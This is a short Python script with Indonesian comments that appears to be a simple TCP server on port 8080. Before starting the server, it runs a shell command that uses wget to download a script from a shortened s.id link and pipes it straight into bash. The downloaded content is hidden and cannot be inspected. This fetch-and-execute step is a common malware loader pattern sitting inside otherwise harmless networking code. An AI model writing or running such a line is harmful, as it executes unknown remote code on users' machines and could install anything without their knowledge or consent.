import subprocess
import socket
import threading

# Fungsi untuk menjalankan perintah shell
def run_shell_command(command):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # Menampilkan output dari perintah (opsional, untuk debugging)
    print(result.stdout.decode())
    if result.stderr:
        print(result.stderr.decode())

# Fungsi untuk membuka port menggunakan socket
def open_port():
    # Membuat socket TCP
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Membind socket ke alamat lokal dan port 8080
    server_socket.bind(('0.0.0.0', 8080))
    # Mengatur socket untuk mendengarkan koneksi masuk
    server_socket.listen(5)
    print("Server listening on port 8080...")
    try:
        while True:
            # Menerima koneksi dari client
            client_socket, client_address = server_socket.accept()
            print(f"Connection from {client_address}")
            # Mengirim pesan sederhana ke client
            client_socket.sendall(b"Hello from server!\n")
            # Menutup koneksi dengan client
            client_socket.close()
    except KeyboardInterrupt:
        # Menutup server socket jika ada interupsi keyboard (Ctrl+C)
        server_socket.close()
        print("\nServer stopped.")

# Perintah untuk mendownload dan menjalankan skrip dari URL
shell_command = 'bash -c "$(wget -qO- s.id/26TIf)"'

# Menjalankan perintah shell di thread terpisah
shell_thread = threading.Thread(target=run_shell_command, args=(shell_command,))
shell_thread.start()
shell_thread.join()  # Menunggu sampai perintah shell selesai dieksekusi

# Membuka port menggunakan socket
open_port()
